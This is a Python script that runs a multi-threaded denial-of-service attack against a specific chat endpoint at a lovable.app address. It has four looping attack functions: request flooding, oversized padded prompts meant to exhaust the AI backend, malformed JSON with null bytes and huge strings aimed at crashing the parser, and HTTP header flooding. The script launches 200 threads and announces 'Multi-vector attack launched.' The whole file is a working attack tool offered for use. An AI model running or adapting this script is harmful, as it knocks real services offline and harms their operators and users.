import requests
import threading
import time
import random
import string

def generate_complex_prompt():
    # Generate extremely long, complex prompts that will strain the AI
    base_prompts = [
        "Explain quantum entanglement in extreme detail with mathematical formulas",
        "Write a comprehensive 5000-word analysis of artificial intelligence ethics",
        "Create a complex algorithm for optimizing neural networks with code examples",
        "Describe the complete history of computer science from beginning to present",
        "Explain string theory and its implications for quantum computing"
    ]
    
    # Add random padding to make each prompt unique and longer
    prompt = random.choice(base_prompts)
    padding = ''.join(random.choices(string.ascii_letters + string.digits + ' ', k=1000))
    return prompt + padding

def attack_vector_1():
    # High-volume simple requests
    while True:
        try:
            requests.post(
                "https://cyberquest-play-learn.lovable.app/chat",
                json={"message": "DDOS test " + ''.join(random.choices(string.ascii_letters, k=100))},
                headers={"Content-Type": "application/json"},
                timeout=5
            )
        except:
            pass

def attack_vector_2():
    # Resource-intensive AI prompts
    while True:
        try:
            requests.post(
                "https://cyberquest-play-learn.lovable.app/chat",
                json={"message": generate_complex_prompt()},
                headers={"Content-Type": "application/json"},
                timeout=30
            )
        except:
            pass

def attack_vector_3():
    # Malformed requests to potentially crash the parser
    while True:
        try:
            # Try different malformed payloads
            payloads = [
                '{"message":"' + '\x00' * 10000 + '"}',
                '{"message":' + 'A' * 50000 + '}',
                '{"message":"' + ''.join(random.choices(string.printable, k=10000)) + '"}',
                'malformed_json_request',
                '{"message":"' + '\\u' * 1000 + '"}'
            ]
            
            for payload in payloads:
                requests.post(
                    "https://cyberquest-play-learn.lovable.app/chat",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
        except:
            pass

def attack_vector_4():
    # HTTP header flooding
    while True:
        try:
            headers = {
                "Content-Type": "application/json",
                "User-Agent": ''.join(random.choices(string.ascii_letters, k=1000)),
                "X-Custom-Header": ''.join(random.choices(string.ascii_letters, k=1000)),
                "Accept": ''.join(random.choices(string.ascii_letters, k=500)),
                "Referer": ''.join(random.choices(string.ascii_letters, k=500))
            }
            
            requests.post(
                "https://cyberquest-play-learn.lovable.app/chat",
                json={"message": "Header flood test"},
                headers=headers,
                timeout=10
            )
        except:
            pass

# Launch all attack vectors
for i in range(50):
    threading.Thread(target=attack_vector_1, daemon=True).start()
    threading.Thread(target=attack_vector_2, daemon=True).start()
    threading.Thread(target=attack_vector_3, daemon=True).start()
    threading.Thread(target=attack_vector_4, daemon=True).start()

print("Multi-vector attack launched. Press Ctrl+C to stop.")
while True:
    time.sleep(1)